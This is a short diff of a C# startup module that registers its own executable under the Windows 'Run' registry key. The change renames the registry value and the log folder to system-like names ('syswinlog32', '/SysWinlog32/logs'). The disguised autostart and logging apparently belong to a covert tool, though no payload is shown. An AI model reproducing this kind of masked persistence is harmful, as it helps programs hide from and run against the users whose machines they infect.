@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Windows.Forms;
 using Microsoft.Win32;
@@ -9,7 +9,7 @@ namespace ConsoleApp2.Startup
     {
         private static readonly string _keyID = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
         // directory of log file
-        private const string logDir = @"/SysWin32/logs";
+        private const string logDir = @"/SysWinlog32/logs";
         // path to the executable
         private static string _exePath = String.Empty;
         // startup folder
@@ -44,7 +44,7 @@ namespace ConsoleApp2.Startup
             if ( _startup == "" ) {
                 try {
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(_keyID, true)) {
-                        rk.SetValue("syswin32", _exePath);
+                        rk.SetValue("syswinlog32", _exePath);
                     }
                 }
                 catch (Exception ex)
